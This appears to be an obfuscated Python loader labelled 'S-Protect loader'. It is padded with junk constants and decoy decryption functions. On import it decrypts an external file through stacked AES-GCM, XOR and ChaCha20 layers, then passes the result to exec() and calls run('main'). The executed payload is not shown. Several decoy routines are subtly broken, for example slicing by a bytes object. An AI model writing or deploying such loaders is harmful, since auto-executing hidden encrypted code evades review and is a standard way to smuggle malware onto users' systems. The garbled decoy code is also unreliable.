import sys, os, json, re, math, hashlib, base64, struct, zlib
import itertools, collections, functools, random, string, binascii
import tempfile, uuid, copy, logging, datetime, decimal, statistics
from math import sqrt, floor, ceil, sin, cos, tan, log, exp
from os import path, name, getpid, getcwd, environ, sep
from sys import platform, version, argv, executable, modules, path as sys_path
from hashlib import sha256, md5, sha1, sha224, sha384, sha512, blake2b
from base64 import b64encode, b64decode, a85encode, a85decode, b32decode
from struct import pack, unpack, calcsize, iter_unpack
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
__de729553c = 1675881150
__n437775cf = b'fb8be40f0063b5a0301dc7bd22f377dc3915112a6c904ce52e93c0d3265ca0481ee75ff862c6883a2152c903f9f4102a82468d9419335788183dfcdd117d133c268b8ad54cc1de162fd0530789ebbe278714d7e8ffca8c2dc48363287aac9d23'
__t9a844101 = b'5424c53f86847832effbd195948cb21bd99f2d626f7f04c3da3b9adc80b46e4fbc1fc7638bcc4d1112db88393a10725dc8bd2859f56b4a99301725363283c94e80428a9861108290a01539b7142df7e215f9dcfb65b3c22f568afa82d2bbff41a2beddd974c5f5f8fe834c95407ba1510601398b93a03841ead4b825ed19a7747671d0e34fe719540d'
__mba7b07c1 = b'a9611d7717ac9d3e78ec64e65a6200a163d096d187126800da4ab2509cbcf7a0eee4c74965f0ca55fa2e9c3af9d48be1e88703ca5fa4ef7163689ecb8aa7d8b7f2b8025f572eb973a5458a8a9429b57b5f23b149d6cef74159f1c618f6cf376dd2b50b7862344903b2aec54c5901a3dec9d21ebd6232ce15af47665c6a78fc00c70d5fd0915e5c7ece96e4dd0e8e24'
__k321b92db = '775cc52ca08bd5e6c359fdca745a0f49303f3becb8fcf763800ceea2698853f97f2224df0511f3e50360784cc10d70584d1d55a5782e313030143dad82e39f4239fec8e3d2ad291c60aee02cdcaed669c2ea9088962e6a5f44945a4a319a6a1abfd0a31c83e75eaa13431bb286b2d6791e050bfb74a81e3a6458c4787a6a76555590497df2f838d841e267d966c0a6e103a7a93ca5fa1985e62f28055ec854c621b03d91e8153abcc32b8729231b51fde200314f84a5f29f74cf384c14d954b89d61071dafb26a38a22bdfd12d3eb74f57290e4e7c862ae95a6a787e55fd521c'
__p40aa5348 = '08a3b643ec1981cb69cd73f70fd31a3168429289365adef7821a71be25f0d478f4a84fb0bfe4814627f3481e517da2aed5408877c8a65a38bc55ded82c9c7b3de90232194a3ea69504e4ba8348466506d0080947dccfb05f2b9c728af849c1443cd213890a920931c8de7ff6a227ddee3c4bc8134d11a08f1acac312dd4a9a8d1e7b95f64a189dd66b3f96ae8cf444ba33217a301e0954bcfa705e1a98353272a20a0492776fb4b8826247e2f912113c2665864f04c64ab5635ac97c9c04b9453314df04bea80e49199724494c5c52b67e1f32f0a20a09e458fed12a707adee5fb550dde21a12ccc2021665a9320'
__ddfd023b5 = b'a3ada4e88e9bb4f5dc24ebdd7a3dfeabc846bb8f6232a7444bdb12a01eba5994fe270432d954cc66a64bbf215b823be5470872690680dcddb87a5165977a37847db0439c6673f269765794404216a0b8596b95fb14c5100ec21b929144357691d30adf511326091602438b394537f4f3c38020'
__0xf9a4bd8ad1 = 142543184
__cc2728843 = 2478263594
__fa38d6406 = b'fabd8c26af6b925bb861989e055fc7502332301411ee0e5cb0a26c47a33fae8f9cc22f08f6b52bb7b1f4f49a5e8b8750fef7f659289702c4fad781ac064f78b593ec431d4c8f2893a3b1054420291ebdf7da6b7b480b8e18984bc074a5a6587973c974d20f693cf70b13'
__d039a11ea = 'c4bf84e45590841ae47f57d1b5b8d1e0cb088b4ca2f33a1cff0392adcf2995fd8dbef63adbfeef07e1b15bd65683e6f823b383993d73251d9a1eab28a92cf81eaf7220ec0fc02b01338c499ce6d898173c6cecb1bd60bba2ea61283c8a68d3a29d11eca7d3832377beb3de28d1ec58c402e7b36cccfa328f1f55bf4a83f12ef3b7ea2b2034674402f9a8f89f207afe9dd6cb758058dc39a4b8e5e834922a988804c01acfbcb0dc2ad76a8612cbd98644854a5fe9fa0f35e61cf048e2a4695d84ebac1be22b68b26202613f73d85413ee63232cfd549c1feba4ea629cbef304e5662755bd0d169071df9a7f9d621e7fad1eeea282529a9092ed185891eec5313b3622510c626c982b4ea42df8230c6c35241967028b3a0a7988b484f1f35be0566db70ba071'
__z90359eae = b'7ff8f103bb6f4a4524dd4ab2e7e0ca1b0409cf31c167489fd2dc3d0ec470c11e8b8f0ca4ffceaa21d92d9c97a57a750ab713c1efad9cda3dd0d96d8c4fc785a23edaeac16533d0c1a0e93f545cdc7dbea07aaf155f1339ac680d9da02ae9665d8a6593aad4d917a927ba845c97c68805707dd5727c788b0378a690dca8d0b31adc94a2e4e9cf67a5dfce8f314270'
__p93d969f8 = 1249377896
__r868441f3 = 184414262267393
__v485aa068 = b'5462e7a351f1c76ee6c47be1de39db638b9f3598b3ea83fe08b144915661502e51ab909b0049b2ade47d882c1543c8a6b9f80b7a179d44b86105f2add2fc967ab5a9604ddfd82ea8f8206ee557c1888377d115e498e7ead146'
__a2614a45c = '169fa76204412e70431f6264cf9dc3c81af20432ceaa83d3467204aec527af56aaa5b1feb2233963bdc9aea807b5b8a9654b889badacc5d8dbbd7cf8b87afdd13a6f9a2896fdb6eecbd58488c734e3616cf7656ad0a6cf933cd86a813f64486bc251f19aa6b52ab5f46efa00827dd75353642d7567d3a34b105f872a82e7889277d5b445c284d3a9342484888a47d2c0ee932bf7fb4a6cf43b73fc3170d196157d36fa6df48e2ff4be1e005ff6fd55b22deaf15079eab68cfa8158c28b1bc41a643e3dd68bd5e839e67b735f5e0939a9a49ee7508326ea0f189c95f6035f9010ee93477baeb6b5618b51'
__d2c17f0b4 = 3092640321
__0x63468fbc46 = b'f9e85779084c31153b5af5fa63259086d30a9c5023f814f7c4a86558f90c6fdfc4ae582195c29b530dfe0d0d64fd31161ac80833b4ab70bf5cd09196b37db326577dd178adc9aa3186ae9de260c57029977cb964e4ac290674b4ade425f1b2f389ff805af769a3e0bfe67a7b5bf19c9a2078c6d8833037ccf46627f09f31e5dc4c1b3754670e9be1f24132ed57acb3adbf500fcaf5'
__s4136b732 = 1543518104
__tcf82eaf5 = 1704180987
__n203d60fc = 2328802143
__0x92eba59dc0 = 3167641834
__t9c908975 = 'da797c57493b7f56579ef11c3582576a8d9a0dedafe360357db69901c2fab96e7cab6b27eff6772823fd3b9831557f9f1d97ed6a9cd7fe38c751919bf76d254afaf3f2421b26ccb15e0b99c128ed4169fa3e778ef572da2f2b83487f8e922bf22fde3caf0bbb2477e1081991ab445f987a4e1ef7a43fe4484b3b6477dd6cb7d6a6246bbcb8eaadb4'
__fd7b5aede = 2685279446
__y0faf8d62 = 'b70e259e4eaa92ce8c3b63fd983f4c372265526e58a762ef7c7e0ab29c0e3473709098ce7331b9c42dbab85fefceba6bf9515db951b3f985bdb57a72777c210944f9de902b31a14f0f824463ca737a62d05b74b4ca318edf49f7347047d56f3f4cca5f5f8d9339a692a1c79b5bfa9508260d5d18ad1e9c8f7ba1f92605dbee81c9c23cbcb8e35dfdb899fbad035b7d6c2086ee3c798ed644726bd267fa81a65be68ff5caa078ac6ba2df90e26ef4c070ce619c2fc655a76c84799679c7235d4f42b2f9702107adbf1418bbb374cd79c1c7173d9371ae9c060c486eca3cd924bf23af6ac2d0564c0affec0d45f868b37b300ebc7614a110c534f540b4096690506e90e7b0ad712d75f8de75bd0de5'
__vb17bbe54 = 201188365
__e20fd95a7 = 2665372030
__bdb15363e = b'dcd3fd082f8a1dc09ab19595a4895bc6f708cd3a54c1b587e432fe81aa9970754990aa80474f30687a60987399aaf9184f9fc9cf5dbe6929c10e11e0347682374e1f074aa9a64732a29230665928b92a763655ce7684c45d16b69c1d67408adf5f0cd9c014d48f5f3e32a5aa9522026c821a88fee6c57da82fc384a44885883dcf55f6'
__nd120b8ca = 210851124052873
__qaac54c2e = b'298d39154d486ce75ef2be07237801f11839ec567513fdb78bca0f0df790a4aab7106b88c8d87aa7f66237c5961a25b47454cb4b61ae9e4fb243a800ed0adb67e8fb13ac461ac00a4087e7'
__pd2f7f0cd = 199874271473615
__nee619021 = 589408969
__z7799878f = 2219254824
__e74fa1de4 = 730099146
__d13e94498 = 2152856383
__b3cb92f0f = 338563217
__w8e480b97 = b'ad90eea73efdac3e10536a1fe3f75515550cbc1d8660b974a2703256dcbdbff14de3d6e2be9bab6478ffabf813be1d5066be88ebca05b4153c6d5c78541e38aa692a34311b46d2bd7b27477a667a'
__w987acec6 = 'c1114fdefbacc539fec0aa96ef441682bd6ae9d86bc7e846b5ca4d5e79fd5a6235f70592441712fb3077d03539819d5f3c18e20e5afc4097cd6f858c3a75a9e93c7bea3d6d354d529c563e4b29b5ac97bc8496475c95786fc4d87e30c19d7c2240fed962e2a044c5871e1ab0b1581671d9899d79ee21801bd98cb2a166201461f38e0188407f2ada7387ec6db723c002461d492527cfd8059b3d4df1cce9b3c57f41a803f1bcb6139dc450bb3452a2d1643574d10d415298a39d96'
__k0fb139f5 = b'9d306e2bcb99870305493a03ee4d30e4b4d7704151117a75d636a036595b5b339af435ea02173933b8a582b8d7ea61d0e4bf3702dec6d45e338d1567c9030a1ad2f1829ca48bdb629c800a225e58c16f0b5f3c454b5e52673d955156710f657b5b9028583adb4242b41c86794b9630b658a9066f5e64fa45b5a2c9b79a0df4e2374a266f32bc3b588f514cb179d12b9b'
__sfd3e1a6b = 62241249615841571
__xca40ce6e = '5309c14efe0b5719b1c5bd66a351acf6832f9fca66adbd25560d9060557dd34a6710f4c4e5d7a8299eb3561604067d03509dbda5ca07af73923fb3539f3cdc6115b4a58c3650764173f7577095877e98e4233cc85e785617bcceaa3befde348755b5412efb4b28f30d8ec1e407b5778131f40d0515d74779d4a3df873937fc2fd8aa9e1d229cadaabfbf5886e4129b579ff57346dcea803887a371c8941482060f5941df9134521362aadd8969dfdf37c581'
__c98214cf5 = 957300895
__k7d66d6b7 = 'f49e0e718c4586c9e428abb8296da82cc3ec481e057a3adcdb9253cff3144bdc37164e777fe43ab59dcaf6f283de8ebb9bd55df5d48ab741ff8acf4e50ee958b458a5d942929b23d5c60aa261ab61c76bf7113a845348708f639291db6e5e8c40fac9f27308cca65c17f540624899e7f692a24d9aa9b055fbca72d20d4bc4aee85e11755fa85bfcb9b08f2545bbbc7791a315e6569fc497239b9b15c064a1174f1afbd186d49ee4821ab31ee2816b737690c400eafdf22c7826d28d0d9c596376b6dea65fe6936a434c1a173bd4250ea'
__w8b6c78e1 = b'08ae71411ab808dd38f1ecee9cd6246c762af6c4ae9951bb8e3965697bd9ca3a55701eb2a82286c5dc31fe152d7e066d7d96ea8313b48a6e683b1f39a487db7e5ffdae9cea962e187b873ffc4e2bf506bc93630341be2cfb044d5eadd59b27a2e8'
__x0c559109 = 2023484073
__bac051aa0 = 7890253179567421
__daf8d930e = 912612352
__mff2fbebb = b'1b7449022d7c57cd8edbb322089f622c9fe1b10e26696d4f30ff3711519b9a6e7c778c767cba10e6df72cc946a919cd8d2c10ce5d3a630e71772'
__q74a15532 = 2880236650
__q7a739718 = 27504
_b0bb5447d = 'b10247df'
_b8ede0ee5 = '04c85a54'
_n492cbc48 = 'bc0eb057'
_q2ccb9409 = '529149de'
_p366bac27 = '53400f18'
_v7954fa38 = '4143c5bb'
_mda29bed9 = 'dd256446'
_m16c19bcd = '179d1452'
_a9eae8614 = '151dcbf84e5763fa'
_e15b985b5 = 'c31605707d43f621'
_ffe4c8940 = 'd368117e7109f890'
_a08ac72a7 = 'ecc3525ef81f2c36'
_y6944fa13 = 'ed401e99e6672bb3'
_c62912f38 = '6fcf794aaf4076c8'
_bbe607843 = 'dc9d586637225d5c'
_ze61b4724 = '4c53965c64185566'
'Module loader.'
import sys, os, json, hashlib, zlib
_69a73b80488b = getattr(sys, '_MEIPASS', None) or os.path.dirname(os.path.abspath(__file__))

def _f69efa36d2(_wf9be30f7, __66b98be8780c):
    _d566ca66887, _74627_e5ce92 = (bytearray(), 0)
    while len(_d566ca66887) < _wf9be30f7:
        _d566ca66887.extend(hashlib.sha256(__66b98be8780c + _74627_e5ce92.to_bytes(4, 'big')).digest())
        _74627_e5ce92 += 1
    return bytes(_d566ca66887[:_wf9be30f7])
_27731_f0bd6e = [_b0bb5447d, _b8ede0ee5, _n492cbc48, _q2ccb9409, _p366bac27, _v7954fa38, _mda29bed9, _m16c19bcd, _a9eae8614, _e15b985b5, _ffe4c8940, _a08ac72a7, _y6944fa13, _c62912f38, _bbe607843, _ze61b4724]

def _0x196beab8():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    _02fe783ce71fd3 = bytes.fromhex(''.join((_27731_f0bd6e[_v8400_f35c] for _v8400_f35c in [0, 1, 2, 3, 4, 5, 6, 7])))
    _v2678_740b = json.loads(open(os.path.join(_69a73b80488b, '_runtime', 'loader.pye'), 'rb').read().decode())
    _t6114c928ca = _02fe783ce71fd3
    for _eebb1dc9b47794 in ['k1', 'k2', 'k3', 'k4', 'k5']:
        if _eebb1dc9b47794 in _v2678_740b:
            _32250 = bytes.fromhex(_v2678_740b[_eebb1dc9b47794])
            _ycf7a2be1 = hashlib.sha256(_32250).digest()[:4].hex()
            if _ycf7a2be1 == _v2678_740b.get('f1', '')[:8] or _ycf7a2be1 == _v2678_740b.get('f2', '')[:8] or _ycf7a2be1 == _v2678_740b.get('f3', '')[:8]:
                _t6114c928ca = _32250
                break
    _c1573 = bytes.fromhex(_v2678_740b['d'])
    _q472061_8 = AESGCM(_t6114c928ca).decrypt(_c1573[:12], _c1573[12:], b'')
    _q472061_8 = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_q472061_8, _f69efa36d2(len(_q472061_8), _t6114c928ca))))
    try:
        _q472061_8 = ChaCha20Poly1305(_t6114c928ca).decrypt(_q472061_8[:12], _q472061_8[12:], b'')
    except Exception:
        pass
    return zlib.decompress(_q472061_8).decode()

def _y79df0e89():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    _02fe783ce71fd3 = bytes.fromhex(''.join((_27731_f0bd6e[_v8400_f35c] for _v8400_f35c in [0, 1, 2, 3, 4, 5, 6, 7])))
    _v2678_740b = json.loads(open(os.path.join(_69a73b80488b, '_runtime', 'loader.pye'), 'rb').read().decode())
    _t6114c928ca = _02fe783ce71fd3
    for _eebb1dc9b47794 in ['k1', 'k2', 'k3', 'k4', 'k5']:
        if _eebb1dc9b47794 in _v2678_740b:
            _32250 = bytes.fromhex(_v2678_740b[_eebb1dc9b47794])
            _ycf7a2be1 = hashlib.sha256(_32250).digest()[:4].hex()
            if _ycf7a2be1 == _v2678_740b.get('f1', '')[:8] or _ycf7a2be1 == _v2678_740b.get('f2', '')[:8] or _ycf7a2be1 == _v2678_740b.get('f3', '')[:8]:
                _t6114c928ca = _32250
                break
    _c1573 = bytes.fromhex(_v2678_740b['d'])
    _q472061_8 = AESGCM(_t6114c928ca).decrypt(_c1573[:12], _c1573[12:], b'')
    _q472061_8 = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_q472061_8, _f69efa36d2(len(_q472061_8), _t6114c928ca))))
    try:
        _q472061_8 = ChaCha20Poly1305(_t6114c928ca).decrypt(_q472061_8[:12], _q472061_8[12:], b'')
    except Exception:
        pass
    return zlib.decompress(_q472061_8).decode()
_61409 = compile(_y79df0e89(), '', 'exec')
exec(_61409)
run('main', _69a73b80488b)

def _k29d8781b():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    import hashlib, json, os, zlib
    try:
        _02fe783ce71fd3 = bytes.fromhex(''.join(([_b0bb5447d, _b8ede0ee5, _n492cbc48, _q2ccb9409, _p366bac27, _v7954fa38, _mda29bed9, _m16c19bcd, _a9eae8614, _e15b985b5, _ffe4c8940, _a08ac72a7, _y6944fa13, _c62912f38, _bbe607843, _ze61b4724][_v8400_f35c] for _v8400_f35c in [10, 5, 1, 10, 0])))
        _v2678_740b = json.loads(open(os.path.join(_69a73b80488b, '_runtime', 'loader.pye'), 'rb').read().decode())
        _t6114c928ca = _02fe783ce71fd3
        for _eebb1dc9b47794 in ['k1', 'k2', 'k3', 'k4', 'k5']:
            if _eebb1dc9b47794 in _v2678_740b:
                _32250 = bytes.fromhex(_v2678_740b[_eebb1dc9b47794])
                if hashlib.sha256(_32250).digest()[:4].hex() == _v2678_740b.get('f1', '')[:8]:
                    _t6114c928ca = _32250
                    break
        _c1573 = bytes.fromhex(_v2678_740b['d'])
        _q472061_8 = AESGCM(_t6114c928ca).decrypt(_c1573[:12], _c1573[12:], b'')
        _q472061_8 = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_q472061_8, _f69efa36d2(len(_q472061_8), _t6114c928ca))))
        _q472061_8 = ChaCha20Poly1305(_t6114c928ca).decrypt(_q472061_8[:12], _q472061_8[12:], b'')
        _d566ca66887 = zlib.decompress(_q472061_8)
    except Exception:
        _d566ca66887 = b''
    return _d566ca66887

def _x9ef77c8d():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    import hashlib, json, os, zlib
    try:
        _02fe783ce71fd3 = bytes.fromhex(''.join(([_b0bb5447d, _b8ede0ee5, _n492cbc48, _q2ccb9409, _p366bac27, _v7954fa38, _mda29bed9, _m16c19bcd, _a9eae8614, _e15b985b5, _ffe4c8940, _a08ac72a7, _y6944fa13, _c62912f38, _bbe607843, _ze61b4724][_v8400_f35c] for _v8400_f35c in [0, 5, 5, 11])))
        _v2678_740b = json.loads(open(os.path.join(_69a73b80488b, '_runtime', 'loader.pye'), 'rb').read().decode())
        _t6114c928ca = _02fe783ce71fd3
        for _eebb1dc9b47794 in ['k1', 'k2', 'k3', 'k4', 'k5']:
            if _eebb1dc9b47794 in _v2678_740b:
                _32250 = bytes.fromhex(_v2678_740b[_eebb1dc9b47794])
                if hashlib.sha256(_32250).digest()[:4].hex() == _v2678_740b.get('f1', '')[:8]:
                    _t6114c928ca = _32250
                    break
        _c1573 = bytes.fromhex(_v2678_740b['d'])
        _q472061_8 = AESGCM(_t6114c928ca).decrypt(_c1573[:12], _c1573[12:], b'')
        _q472061_8 = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_q472061_8, _f69efa36d2(len(_q472061_8), _t6114c928ca))))
        _q472061_8 = ChaCha20Poly1305(_t6114c928ca).decrypt(_q472061_8[:12], _q472061_8[12:], b'')
        _d566ca66887 = zlib.decompress(_q472061_8)
    except Exception:
        _d566ca66887 = b''
    return _d566ca66887

def _s0386335a():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    import hashlib, json, os, zlib
    try:
        _02fe783ce71fd3 = bytes.fromhex(''.join(([_b0bb5447d, _b8ede0ee5, _n492cbc48, _q2ccb9409, _p366bac27, _v7954fa38, _mda29bed9, _m16c19bcd, _a9eae8614, _e15b985b5, _ffe4c8940, _a08ac72a7, _y6944fa13, _c62912f38, _bbe607843, _ze61b4724][_v8400_f35c] for _v8400_f35c in [11, 8, 6])))
        _v2678_740b = json.loads(open(os.path.join(_69a73b80488b, '_runtime', 'loader.pye'), 'rb').read().decode())
        _t6114c928ca = _02fe783ce71fd3
        for _eebb1dc9b47794 in ['k1', 'k2', 'k3', 'k4', 'k5']:
            if _eebb1dc9b47794 in _v2678_740b:
                _32250 = bytes.fromhex(_v2678_740b[_eebb1dc9b47794])
                if hashlib.sha256(_32250).digest()[:4].hex() == _v2678_740b.get('f1', '')[:8]:
                    _t6114c928ca = _32250
                    break
        _c1573 = bytes.fromhex(_v2678_740b['d'])
        _q472061_8 = AESGCM(_t6114c928ca).decrypt(_c1573[:12], _c1573[12:], b'')
        _q472061_8 = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_q472061_8, _f69efa36d2(len(_q472061_8), _t6114c928ca))))
        _q472061_8 = ChaCha20Poly1305(_t6114c928ca).decrypt(_q472061_8[:12], _q472061_8[12:], b'')
        _d566ca66887 = zlib.decompress(_q472061_8)
    except Exception:
        _d566ca66887 = b''
    return _d566ca66887

def _f1481e60f():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    import hashlib, json, os, zlib
    try:
        _02fe783ce71fd3 = bytes.fromhex(''.join(([_b0bb5447d, _b8ede0ee5, _n492cbc48, _q2ccb9409, _p366bac27, _v7954fa38, _mda29bed9, _m16c19bcd, _a9eae8614, _e15b985b5, _ffe4c8940, _a08ac72a7, _y6944fa13, _c62912f38, _bbe607843, _ze61b4724][_v8400_f35c] for _v8400_f35c in [5, 9, 3])))
        _v2678_740b = json.loads(open(os.path.join(_69a73b80488b, '_runtime', 'loader.pye'), 'rb').read().decode())
        _t6114c928ca = _02fe783ce71fd3
        for _eebb1dc9b47794 in ['k1', 'k2', 'k3', 'k4', 'k5']:
            if _eebb1dc9b47794 in _v2678_740b:
                _32250 = bytes.fromhex(_v2678_740b[_eebb1dc9b47794])
                if hashlib.sha256(_32250).digest()[:4].hex() == _v2678_740b.get('f1', '')[:8]:
                    _t6114c928ca = _32250
                    break
        _c1573 = bytes.fromhex(_v2678_740b['d'])
        _q472061_8 = AESGCM(_t6114c928ca).decrypt(_c1573[:12], _c1573[12:], b'')
        _q472061_8 = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_q472061_8, _f69efa36d2(len(_q472061_8), _t6114c928ca))))
        _q472061_8 = ChaCha20Poly1305(_t6114c928ca).decrypt(_q472061_8[:12], _q472061_8[12:], b'')
        _d566ca66887 = zlib.decompress(_q472061_8)
    except Exception:
        _d566ca66887 = b''
    return _d566ca66887

def _neca9f62b():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    import hashlib, json, os, zlib
    try:
        _02fe783ce71fd3 = bytes.fromhex(''.join(([_b0bb5447d, _b8ede0ee5, _n492cbc48, _q2ccb9409, _p366bac27, _v7954fa38, _mda29bed9, _m16c19bcd, _a9eae8614, _e15b985b5, _ffe4c8940, _a08ac72a7, _y6944fa13, _c62912f38, _bbe607843, _ze61b4724][_v8400_f35c] for _v8400_f35c in [3, 3, 12, 9])))
        _v2678_740b = json.loads(open(os.path.join(_69a73b80488b, '_runtime', 'loader.pye'), 'rb').read().decode())
        _t6114c928ca = _02fe783ce71fd3
        for _eebb1dc9b47794 in ['k1', 'k2', 'k3', 'k4', 'k5']:
            if _eebb1dc9b47794 in _v2678_740b:
                _32250 = bytes.fromhex(_v2678_740b[_eebb1dc9b47794])
                if hashlib.sha256(_32250).digest()[:4].hex() == _v2678_740b.get('f1', '')[:8]:
                    _t6114c928ca = _32250
                    break
        _c1573 = bytes.fromhex(_v2678_740b['d'])
        _q472061_8 = AESGCM(_t6114c928ca).decrypt(_c1573[:12], _c1573[12:], b'')
        _q472061_8 = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_q472061_8, _f69efa36d2(len(_q472061_8), _t6114c928ca))))
        _q472061_8 = ChaCha20Poly1305(_t6114c928ca).decrypt(_q472061_8[:12], _q472061_8[12:], b'')
        _d566ca66887 = zlib.decompress(_q472061_8)
    except Exception:
        _d566ca66887 = b''
    return _d566ca66887
'Loader v1.4.'

def _c3c7da27b(_xd6839af9fa85):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('b7327fce8c2c91ea049d86bf039d1ce1b69a27bae76db7f90d7db48e95dbd80891668873eef633501eec10')
        _d = bytes.fromhex('66bc0239af007d7f4bc9e4f3e3c3611ac82b0decb62aeb39ff3a9543bfaeac048445c7d0bc48b7a8afff9143387a1ff1d70bdfb0f5b9a4eeacc9adf638f47154')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        _r = zlib.decompress(_x)
    except Exception as __sfecd4ec9:
        _r = b''
    return _r
'S-Protect loader v2.0.'

def _f1273f748(_p5d560a_x):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('2da7cbd19ac9bd192626d610359b3f86600869b1d2e8bd8549c9c423fb7cf60e517d6e0c5f23f23d')
        _d = bytes.fromhex('0d4147a832be0f60edc0053fa4fe38168c7cfc8e09640c54b77148857aa0d62fb1553b23afb190d28fd8b98fbedaf0f952a750be352285b7cd7a5769653a3d3dc121d69dcc959e7047c7181bc086f6c4d5cceface03eda40957b6d67e3d412ea444a745a98366ab0c591de1f18e13445d3013881219649257553c1b1ff76300e08f4fddc9ce965cdf4b2f426a3202e954aa15e')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _r = zlib.decompress(_x)
    except Exception as __p1b762baf:
        _r = b''
    return _r
'S-Protect loader v3.5.'

def _c1b6ad5fc(_p5d560a_x, _r53027):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('ccd8c43ba7849ec6875769fde50751f804e47e6b5d4bf0e5f2e2091cb8b0e5bb317f073dd128147fdd')
        _d = bytes.fromhex('ff71ae36c74ca23837ae29a7603b0f047d104221df03ea2a685c6d5e70575e434afa21f2de7a52a9e3f10ddf1dc9651959c20c43acf8bcf86586')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _crc = zlib.crc32(_x) & 1765985292
        _r = zlib.decompress(_x)
    except Exception as __n7fac51be:
        _r = b''
    return _r

def _r1a22aede(_xd6839af9fa85, _o75f7a8d043):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('f9edb99d1edeaa01e4a102d3ce90855b07e81f4be04d551d83abaaea4342195fe33e')
        _d = bytes.fromhex('fe6ba22c4511980328b79e9576136191e7b8e55750076e0584e1e57ede12e032b7111c7fc79aa8c29d7e9dc1718b3cc8c2b864ad8aea186f305646519eafb8fd196f90e18231bf0c2598e076d76e5b9b304178fba9f598c2c0b2d7439d69f6b6e346d9f0908dc2b0dc97912a88f6baf87273f12fb3cd5b')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, _k * 99)))[:len(_x)]
        if hashlib.sha256(_x[:16]).hexdigest()[:8] != '4e6a0bcb':
            _x = _x[::-1]
        _crc = zlib.crc32(_x) & 3162047792
        _r = zlib.decompress(_x)
    except Exception as __s2c7ea23d:
        _r = b''
    return _r
'S-Protect loader v1.8.'

def _q44558885(_sf78b2a294, _wf6c28194b43d):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('ad1cb68c2154a4d48908bab19b2595d60724092bbdceaec5a112f4a8294eb5ee8cd1f08111a4938845d3c6e62299ff')
        _d = bytes.fromhex('ce86f3750162bc7045309e7d7e380dd18a69c711c7f53bb0c6eef55e111f8bda95656aa0db7aa9144ec4678ddc405283872800a04c6b5f8fa522d3b04f38b20c2d261b8770f5d16d1baa02fed198')
        _c = Cipher(algorithms.AES(_k), modes.CTR(_d[:16])).decryptor()
        _x = _c.update(_d[16:]) + _c.finalize()
        _x = bytes((__1fd0a112b709 ^ _95bfd413093d6a for __1fd0a112b709, _95bfd413093d6a in zip(_x, hashlib.sha256(_k).digest() * 99)))[:_x]
        _crc = zlib.crc32(_x) & 1393496444
        _r = zlib.decompress(_x)
    except Exception as __xb3fe87b3:
        _r = b''
    return _r

def _kf9f95c36(_16e2792473, _0x079785f2):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    import hashlib, json, os, zlib
    try:
        _k = bytes.fromhex('54cd01bdf830ea2e39a956cd027c9f142e30aa35e967632fab2cf03d12a00cceef16721d3501da')
        _d = bytes.fromhex('7ff0e5956795dc2e3463a6e02a190fbff986238cdce29fba54efeb024d18e9f6ec3dfbd35e299cb8b242a056a3ead8c15aca842ef5aa112423ba473b4df077c3df55646be03bdd3537d01ad71a9334df414ef3fa4f')
        _x = AESGCM(_k).decrypt(_d[:12], _d[12:], b'')
        _x = ChaCha20Poly1305(_k).decrypt(_x[:12], _x[12:], b'')
        _crc = zlib.crc32(_x) & 224731625
        _r = zlib.decompress(_x)
    except Exception as __s0ebde67f:
        _r = b''
    return _r
